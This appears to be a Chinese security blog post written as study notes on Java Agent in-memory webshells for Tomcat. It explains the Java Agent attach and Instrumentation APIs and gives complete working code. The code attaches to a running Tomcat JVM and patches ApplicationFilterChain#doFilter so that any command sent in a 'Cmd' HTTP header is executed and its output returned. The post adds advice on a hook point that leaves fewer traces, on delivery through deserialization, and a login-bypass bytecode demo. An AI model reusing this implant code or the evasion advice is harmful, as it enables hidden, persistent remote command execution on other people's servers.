---
title: "Java Agent 内存马"
date: 2023-01-04T21:11:39+08:00
lastmod: 2023-01-04T21:11:39+08:00
draft: false
author: "X1r0z"

tags: ['java agent', 'tomcat']
categories: ['Java安全']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

Java Agent 内存马学习

<!--more-->

## Java Agent

### 介绍

Java Agent 简单来说就是 JVM 提供的一种动态 hook class 字节码的技术

通过 Instrumentation (Java Agent API), 开发者能够以一种无侵入的方式 (类似 Spring AOP), 在 JVM 加载某个 class 之前修改其字节码的内容, 同时也支持重加载已经被加载过的 class

Java Agent 目前有两种使用方式

1. 通过 `-javaagent` 参数指定 agent, 从而在 JVM 启动之前修改 class 内容 (自 JDK 1.5)
2. 通过 `VirtualMachine.attach()` 方法, 将 agent 附加在启动后的 JVM 进程中, 进而动态修改 class 内容 (自 JDK 1.6)

两种方式分别需要实现 premain 和 agentmain 方法, 而这些方法又有如下四种签名

```java
public static void agentmain(String agentArgs, Instrumentation inst);
public static void agentmain(String agentArgs);
public static void premain(String agentArgs, Instrumentation inst);
public static void premain(String agentArgs);
```

其中带有 `Instrumentation inst` 参数的方法优先级更高, 会优先被调用

### IDE 配置

Java 规定 Java Agent 程序必须要打包成 jar 格式,同时需要提供一个 `MANIFEST.MF` 文件来配置 Java Agent 的相关参数

首先在 resources 目录下创建 `META-INF/MANIFEST.MF`, 内容如下

```ini
Manifest-Version: 1.0
Agent-Class: com.example.Demo
Premain-Class: com.example.Demo
Can-Redefine-Classes: true
Can-Retransform-Classes: true

```

看参数名就知道是什么意思

然后打开项目结构, 工件, 添加 JAR

![image-20230103220457777](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301032205886.png)

![image-20230103220710067](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301032207097.png)

最后打包的时候点击 "构建工件", 选择 jar - 构建即可生成 jar

![image-20230103220801951](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301032208986.png)

然后还有一个比较蛋疼的地方在于  `com.sun.tools.attach.VirtualMachine`  这个类, 它位于 tools.jar 里面, 但是这个 jar 包默认并不在 JDK 的 classpath 目录下, 需要手动添加

![image-20230103221122169](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301032211231.png)

编辑 pom.xml

```xml
<dependency>
    <groupId>com.sun</groupId>
    <artifactId>tools</artifactId>
    <version>1.8</version>
    <scope>system</scope>
    <systemPath>C:/Program Files/Java/jdk1.8.0_40/lib/tools.jar</systemPath>
</dependency>
```

maven 同步完之后如果不出意外的话就会在外部库中显示这个 tools.jar

![image-20230103221412443](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301032214471.png)

### premain 方式

```java
package com.example;

import java.lang.instrument.Instrumentation;

public class Demo {
    public static void premain(String args, Instrumentation inst) throws Exception {
        System.out.println("premain");
    }

    public static void main(String[] args) throws Exception{
        System.out.println("main");
    }
}
```

MANIFEST.MF (注意加上空行)

```ini
Manifest-Version: 1.0
Premain-Class: com.example.Demo

```

打包成 jar 之后新开一个 idea 项目

指定 vm 参数如下

```bash
-javaagent:jarpath
```

![image-20230104163229994](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041632835.png)

![image-20230104163301189](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041633318.png)

### agentmain 方式

这种方式需要用到 VirtualMachine 来附加 JVM 进程

先随便写一个持续运行的程序, 然后通过 `jps -l` 查看 jvm pid

![image-20230104163611259](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041636418.png)

编写 agent

```java
package com.example;

import com.sun.tools.attach.VirtualMachine;

import java.io.File;
import java.lang.instrument.Instrumentation;

public class Demo {
    public static void agentmain(String args, Instrumentation inst) throws Exception {
        System.out.println("agentmain");
    }

    public static void main(String[] args) throws Exception{
        VirtualMachine vm = VirtualMachine.attach("11860"); // 附加指定进程, 得到 VirtualMachine 实例
        String agentpath = new File("JavaAgentDemo.jar").getAbsolutePath();
        vm.loadAgent(agentpath); // 加载 agent, 需要指定绝对路径
        vm.detach(); // 取消附加

    }
}
```

这里我比较懒就把 agentmain 和 main 写在一起了

MANIFEST.MF

```ini
Manifest-Version: 1.0
Agent-Class: com.example.Demo

```

![image-20230104164113729](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041641957.png)

当然也可以换一种更优雅的加载方式

```java
package com.example;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.io.File;
import java.lang.instrument.Instrumentation;
import java.util.List;

public class Demo {
    public static void agentmain(String args, Instrumentation inst) throws Exception {
        System.out.println("agentmain");
    }

    public static void main(String[] args) throws Exception{
        List<VirtualMachineDescriptor> list = VirtualMachine.list(); // 得到 JVM 进程列表
        for (VirtualMachineDescriptor desc : list){ // 遍历
            String name = desc.displayName(); // 进程名
            String pid = desc.id(); // PID

            if (name.contains("com.example.Hello")){
                VirtualMachine vm = VirtualMachine.attach(pid);
                String path = new File("JavaAgentDemo.jar").getAbsolutePath();
                vm.loadAgent(path);
                vm.detach();
                System.out.println("attach ok");
                break;
            }
        }
    }
}
```

![image-20230104164354120](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041643327.png)

### Instrumentation 修改字节码

Instrumentation 就是 Java Agent 提供给我们的用于修改 class 字节码的 API

它的的具体使用可参考官方文档

[https://docs.oracle.com/javase/9/docs/api/java.instrument-summary.html](https://docs.oracle.com/javase/9/docs/api/java.instrument-summary.html)

这里仅列出几个常用的方法

```java
// 获取已被 JVM 加载的所有 class
Class[] getAllLoadedClasses();

// 添加 transformer 用于拦截即将被加载或重加载的 class, canRetransform 参数用于指定能否利用该 transformer 重加载某个 class
void addTransformer(ClassFileTransformer transformer, boolean canRetransform);

// 重加载某个 class, 注意在重加载 class 的过程中, 之前设置的 transformer 会拦截该 class
void retransformClasses(Class<?>... classes);
```

添加的 transformer 必须要实现 ClassFileTransformer 接口

```java
public interface ClassFileTransformer {
    byte[]
    transform(  ClassLoader         loader,
                String              className,
                Class<?>            classBeingRedefined,
                ProtectionDomain    protectionDomain,
                byte[]              classfileBuffer)
        throws IllegalClassFormatException;
}
```

className 是 JVM 形式的 class name, 例如 `java.util.HashMap` 在 JVM 中的形式为 `java/util/HashMap` (`.` 被替换成了 `/`)

classfileBuffer 是原始的 class 字节码, 如果我们不想修改某个 class 就需要把这个变量原样返回

剩下的参数一般用不到

为了演示修改字节码这个过程, 先准备一个测试程序

```java
package com.example;

public class CrackTest {
    public static String username = "admin";
    public static String password = "fakepassword";

    public static boolean checkLogin(){
        if (username == "admin" && password == "admin"){
            return true;
        } else {
            return false;
        }
    }
    public static void main(String[] args) throws Exception{
        while(true){
            if (checkLogin()){
                System.out.println("login success");
            } else {
                System.out.println("login failed");
            }
            Thread.sleep(1000);
        }
    }
}
```

编写 agent

```java
package com.example;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import javassist.*;

import java.io.File;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;
import java.util.List;

public class CrackDemo {

    public static void agentmain(String args, Instrumentation inst) throws Exception {
        for(Class clazz : inst.getAllLoadedClasses()){ // 先获取到所有已加载的 class
            if (clazz.getName().equals("com.example.CrackTest")){
                inst.addTransformer(new TransformerDemo(), true); // 添加 transformer
                inst.retransformClasses(clazz); // 重加载该 class
            }
        }
    }

    public static void main(String[] args) throws Exception{
        String pid, name;
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for(VirtualMachineDescriptor vmd : list){
            pid = vmd.id();
            name = vmd.displayName();
            if (name.equals("com.example.CrackTest")){
                VirtualMachine vm = VirtualMachine.attach(pid);
                String jarName = new File("JavaAgentDemo.jar").getAbsolutePath();
                vm.loadAgent(jarName);
                vm.detach();
                System.out.println("attach ok");
                break;
            }
        }
    }
}

class TransformerDemo implements ClassFileTransformer{
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        if (className.equals("com/example/CrackTest")) { // 因为 transformer 会拦截所有待加载的 class, 所以需要先检查一下 className 是否匹配
            try {
                ClassPool pool = ClassPool.getDefault();
                CtClass clazz = pool.get("com.example.CrackTest");
                CtMethod method = clazz.getDeclaredMethod("checkLogin");
                method.setBody("{System.out.println(\"inject success!!!\"); return true;}"); // 利用 Javaassist 修改指定方法的代码
                byte[] code = clazz.toBytecode();
                clazz.detach();
                return code;
            } catch (Exception e) {
                e.printStackTrace();
                return classfileBuffer;
            }
        } else {
            return classfileBuffer;
        }
    }
}
```

MANIFEST.MF

```ini
Manifest-Version: 1.0
Agent-Class: com.example.CrackDemo
Can-Redefine-Classes: true
Can-Retransform-Classes: true

```

![image-20230104171332912](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041713158.png)

## 利用 Java Agent 注入内存马

根据 Java Agent 的实现原理我们很容易就能把它应用到内存马这个方面

实现的思路就是找一个比较通用的类,  保证每一次 request 请求都能调用到它的某一个方法, 然后利用 Javaassist 插入恶意 Java 代码

这里先以网上讨论比较多的 `org.apache.catalina.core.ApplicationFilterChain#doFilter` 为例, 但实际上使用这个方法会存在一些问题

![image-20230104190219022](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041902209.png)

ApplicationFilterChain 这个类其实在之前研究 tomcat filter 型内存马的时候就遇到过, 它管理着一组 filter 的调用

从图中可以看出来它的 doFilter 会调用 internalDoFilter, 后者依次取出各种 filter 并链式调用其 doFilter 方法

网上讨论比较多的思路就是利用 Javaassist 在 `ApplicationFilterChain#doFilter` 开头插入恶意 Java 代码

payload 如下

```java
package com.example;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.io.File;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;
import java.util.List;

public class TomcatAgent {
    public static final String CLASSNAME = "org.apache.catalina.core.ApplicationFilterChain";
    public static void agentmain(String args, Instrumentation inst) throws Exception{
        for (Class clazz : inst.getAllLoadedClasses()){
            if (clazz.getName().equals(CLASSNAME)) {
                inst.addTransformer(new TomcatTransformer(), true);
                inst.retransformClasses(clazz);
            }
        }
    }

    public static void main(String[] args) throws Exception{
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for (VirtualMachineDescriptor desc : list){
            String name = desc.displayName();
            String pid = desc.id();

            if (name.contains("org.apache.catalina.startup.Bootstrap")){
//            if (name.contains("com.example.springbootdemo.SpringBootDemoApplication")){
                VirtualMachine vm = VirtualMachine.attach(pid);
                String path = new File("JavaAgentDemo.jar").getAbsolutePath();
                vm.loadAgent(path);
                vm.detach();
                System.out.println("attach ok");
                break;
            }
        }
    }
}

class TomcatTransformer implements ClassFileTransformer{
    public static final String CLASSNAME = "org.apache.catalina.core.ApplicationFilterChain";
    public static final String CLASSMETHOD = "doFilter";

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        try {
            ClassPool pool = ClassPool.getDefault();
            if (classBeingRedefined != null) {
                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
                pool.insertClassPath(ccp);
            }
            if (className.replace("/", ".").equals(CLASSNAME)) {
                CtClass clazz = pool.get(CLASSNAME);
                CtMethod method = clazz.getDeclaredMethod(CLASSMETHOD);
                method.insertBefore("javax.servlet.http.HttpServletRequest httpServletRequest = (javax.servlet.http.HttpServletRequest) request;\n" +
                        "String cmd = httpServletRequest.getHeader(\"Cmd\");\n" +
                        "if (cmd != null){\n" +
                        "    Process process = Runtime.getRuntime().exec(cmd);\n" +
                        "    java.io.InputStream input = process.getInputStream();\n" +
                        "    java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(input));\n" +
                        "    StringBuilder sb = new StringBuilder();\n" +
                        "    String line = null;\n" +
                        "    while ((line = br.readLine()) != null){\n" +
                        "        sb.append(line + \"\\n\");\n" +
                        "    }\n" +
                        "    br.close();\n" +
                        "    input.close();\n" +
                        "    response.getOutputStream().print(sb.toString());\n" +
                        "    response.getOutputStream().flush();\n" +
                        "    response.getOutputStream().close();\n" +
                        "}");
                byte[] classbyte = clazz.toBytecode();
                clazz.detach();
                return classbyte;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return classfileBuffer;
    }
}
```

自己本地复现的时候遇到了几个坑, 问题主要出在 agentmain 这里

```java
public static void agentmain(String args, Instrumentation inst) throws Exception{
    for (Class clazz : inst.getAllLoadedClasses()){
        if (clazz.getName().equals(CLASSNAME)) {
            inst.addTransformer(new TomcatTransformer(), true);
            inst.retransformClasses(clazz);
        }
    }
}
// 代码 1
```

稍微改一下

```java
public static void agentmain(String args, Instrumentation inst) throws Exception{
    inst.addTransformer(new TomcatTransformer(), true);
    for (Class clazz : inst.getAllLoadedClasses()){
        if (clazz.getName().equals(CLASSNAME)) {
            inst.retransformClasses(clazz);
        }
    }
}
//代码 2
```

这里我们先复习一下 JVM 的加载特性: 动态加载

什么意思呢? JVM 只会在它需要用到这个 class 的时候才去加载它, 否则就不会加载

而 Java Agent 的功能就是去拦截 class 的加载

所以会出现一个问题: 当你运行 agent 时, JVM 目前还没有加载到 ApplicationFilterChain

这种场景本地复现的时候遇到的比较多, 就是 web 容器已经启动, 但是还没有发送任何 request 请求

而这时候你急急忙忙地去注入 agent 内存马, 添加了 transformer (即上面的代码 2), 然后才去传参 cmd 执行命令 (发送 request 请求)

那么 JVM 在处理 request 请求需要动态加载 ApplicationFilterChain 的时候, 就会先走 transformer 的流程

而 transformer 中我们用的是 Javaassist, 修改字节码前需要先通过 ClassPool 获取到 ApplicationFilterChain 的 CtClass

发现问题了吗? 这里 ApplicationFilterChain 其实并没有被加载, 但是我们还必须得通过 Javaassist ClassPool 来得到它的 CtClass

所以在 tomcat 端会抛出一个 class not found 的异常

```
javassist.NotFoundException: org.apache.catalina.core.ApplicationFilterChain
```

那么在这种场景下, 是不是代码 1 就没有问题了呢? 也不是

因为代码最开头会有一个 for 遍历, 而遍历的对象是 `inst.getAllLoadedClasses()`, 顾名思义就是获取已经加载的 class

之后如果匹配到 ApplicationFilterChain, 就会添加 transformer, 然后重加载这个 class, 让 JVM 走一遍 transformer 的流程

但实际上 ApplicationFilterChain 并没有被加载, 所以 getAllLoadedClasses 返回的结果里面根本就没有它, 这样的话后面也就不会执行 addTransformer, 更不会去重加载 ApplicationFilterChain

所以综上所述, 最终的解决办法就是在启动 web 容器之后, 先手动访问一下网页, 然后再去注入 agent 内存马 (这个时候的代码 1 和代码 2 没有任何区别)

成功执行命令

![image-20230104193459083](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041934199.png)

但是接下来会有另外一个问题

当你执行 calc 时会弹出来两个计算器

![image-20230104193514858](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041935940.png)

如果换成 springboot 环境 (springboot 内嵌 tomcat, 所以也会有 ApplicationFilterChain), 一共会弹出来五个计算器 (

![image-20230104193911186](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041939318.png)

tomcat 调用栈

![image-20230104195019293](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301041950356.png)

从图中可以看到 tomcat 一共调用了两次 `ApplicationFilterChain#doFilter`, 之间调用了一次内置的 WsFilter

然后我们手工添加一个自定义 filter, 再来看调用栈

![image-20230104200004510](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301042000622.png)

调用了三次 `ApplicationFilterChain#doFilter`, 对应弹了三次计算器, 并且每次调用之间夹着内置的 WsFilter 和我们自定义的 HelloFilter

什么原因呢? 来看一下 ApplicationFilterChain 的源码

![image-20230104201142592](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301042011746.png)

跟进到 internalDoFilter 方法

![image-20230104201232194](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301042012324.png)

问题就出在 `filter.doFilter(request, response, this)` 这一行

他向每个 filter 的 doFilter 方法中传入了 this 对象, 也就是 ApplicationFilterChain 本身

而 filter 本身在实现的时候就是需要通过调用 `filterChain#doFilter` 来完成链式反应

![image-20230104201355389](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301042013457.png)

这个 filterChain 实际上就是 ApplicationFilterChain 

所以这也就解释了为什么 tomcat 会弹两次计算器, 并且在我们加入自定义 filter 之后会弹三次

```java
弹两次: 最开始调用 ApplicationFilterChain#doFilter -> WsFilter 调用 filterChain#doFilter

弹三次: 最开始调用 ApplicationFilterChain#doFilter -> HelloFilter 调用 filterChain#doFilter -> WsFilter 调用 filterChain#doFilter
```

这时候再来看 springboot 调用栈

![image-20230104202026588](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301042020664.png)

springboot filter 执行流程跟 tomcat 有一点区别 (多了 OncePerRequestFilter), 但其它部分都是一样的

调用栈中除了 OncePerRequestFilter 以外一共出现了四次其它的 filter, 所以一共会弹出五次计算器

那么最终的结论是什么? 结论是最好不要直接利用 `ApplicationFilterChain#doFilter` 来注入内存马

因为程序会根据 filter 数量的不同, 执行多次 Java 代码 (至少两次), 这种情况在某些场景下可能会干扰正常业务的运行, 甚至会暴露痕迹 (想象一下同时有五个 fscan 在扫内网)

所以正确的做法是去 hook 某个在一次 request 请求中只会被调用一次的方法, 例如 `org.apache.catalina.core.StandardWrapperValve#invoke`

![image-20230104204951671](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301042049795.png)

执行 calc 只会弹一次计算器

![image-20230104204834964](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301042048039.png)

最后说一下关于 agent 依赖包的问题

网上看到很多文章中与反序列化结合的 payload 都是先用 URLClassLoader 在目标环境下加载 tools.jar, 然后通过一堆反射去调用 VirtualMachine 注入已经上传好的 agent.jar (打包了 Javaassist)

我的看法是既然你已经能够上传 agent 了, 那么直接把 tools.jar 一并打包进去就行, 没有必要那么麻烦的去用 URLClassLoader 加载

如果真的有上传大小限制, 那么就先上传 agent, 然后通过反序列化执行 `java -jar agent.jar`, 同时 `-cp` 指定 classpath 为目标环境中 tools.jar 的路径

另外内存马一旦注入了之后 agent jar 包就不能删除, 必须得一直保存在目标服务器上, 这样反而会文件落地, 感觉挺鸡肋的...

关于文件不落地的注入方法可以参考 rebeyond 师傅的文章

[https://mp.weixin.qq.com/s/xxaOsJdRE5OoRkMLkIj3Lg](https://mp.weixin.qq.com/s/xxaOsJdRE5OoRkMLkIj3Lg)

## 参考文章

[https://xz.aliyun.com/t/9450](https://xz.aliyun.com/t/9450)

[http://wjlshare.com/archives/1582](http://wjlshare.com/archives/1582)

[https://su18.org/post/irP0RsYK1/](https://su18.org/post/irP0RsYK1/)

[https://www.cnblogs.com/rickiyang/p/11368932.html](https://www.cnblogs.com/rickiyang/p/11368932.html)

[https://y4er.com/posts/javaagent-tomcat-memshell/](https://y4er.com/posts/javaagent-tomcat-memshell/)

[https://blog.csdn.net/andy_zhang2007/article/details/79031577](https://blog.csdn.net/andy_zhang2007/article/details/79031577)
